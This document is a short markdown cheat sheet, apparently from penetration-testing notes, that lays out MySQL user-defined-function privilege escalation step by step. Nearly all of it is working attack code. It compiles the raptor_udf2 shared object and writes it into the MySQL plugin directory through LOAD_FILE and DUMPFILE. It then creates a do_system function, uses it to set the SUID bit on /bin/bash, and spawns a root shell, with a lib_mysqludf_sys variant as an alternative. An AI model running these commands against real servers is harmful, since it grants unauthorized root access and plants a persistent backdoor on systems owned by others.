# MySQL UDF Shared Object RCE

Compile a User Defined Function (UDF) shared object and load it into MySQL running as root to execute OS commands.

## Prerequisites
- MySQL credentials (any user with `FILE` privilege, or root)
- MySQL running as root (check: `ps aux | grep mysql`)
- Write access to MySQL plugin directory

## Get Plugin Directory
```sql
SHOW VARIABLES LIKE 'plugin_dir';
-- Usually: /usr/lib/mysql/plugin/
```

## Raptor UDF Method
```bash
# Compile raptor_udf2.c (from exploit-db)
gcc -g -c raptor_udf2.c -fPIC -o raptor_udf2.o
gcc -g -shared -Wl,-soname,raptor_udf2.so -o raptor_udf2.so raptor_udf2.o -lc
```

```sql
-- Upload to plugin dir
USE mysql;
CREATE TABLE foo(line BLOB);
INSERT INTO foo VALUES(LOAD_FILE('/tmp/raptor_udf2.so'));
SELECT * FROM foo INTO DUMPFILE '/usr/lib/mysql/plugin/raptor_udf2.so';

-- Create UDF
CREATE FUNCTION do_system RETURNS INTEGER SONAME 'raptor_udf2.so';

-- Execute as root
SELECT do_system('chmod u+s /bin/bash');
```

```bash
/bin/bash -p
```

## Alternative: lib_mysqludf_sys
```sql
CREATE FUNCTION sys_exec RETURNS INTEGER SONAME 'lib_mysqludf_sys.so';
SELECT sys_exec('id > /tmp/out; chmod 777 /tmp/out');
```

## Notes
- Requires `secure_file_priv` to be empty or set to writable path
- Check `SHOW VARIABLES LIKE 'secure_file_priv';`
- MySQL must run as root for full privilege escalation
